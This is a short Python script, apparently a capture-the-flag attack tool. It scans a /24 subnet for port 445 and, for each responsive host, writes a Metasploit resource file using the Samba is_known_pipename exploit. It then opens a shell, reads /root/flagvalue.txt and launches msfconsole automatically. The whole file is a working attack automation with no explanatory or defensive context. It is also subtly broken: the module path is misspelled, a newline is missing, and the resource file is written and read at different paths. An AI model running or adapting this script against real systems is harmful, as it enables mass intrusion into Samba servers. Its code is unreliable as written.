import socket
import sys
import os

print("start")


def nmap(host):
    try:
        s = socket.socket()
        s.connect((str(host), 445))
        s.close()
        return 1
    except Exception as e:
        pass


def at(config, host):
    config = open('1.rc', 'w')
    config.write('use eexploit/linux/samba/is_known_pipename'+"\n")
    config.write('set PAYLOAD cmd/unix/interact'+"\n")
    config.write('set RHOST '+host)
    config.write('set LHOST '+sys.argv[1]+"\n")
    config.write('exploit'+"\n")
    config.write('shell'+"\n")
    config.write('cat /root/flagvalue.txt'+"\n")


def main():
    for ip4 in range(255, 0, -1):
        host = "172.16.103."+str(ip4)
        if(nmap(host) == 1):
            at('', host)
            mg = os.system('msfconsole -r /root/1.rc')


if __name__ == "__main__":
    main()
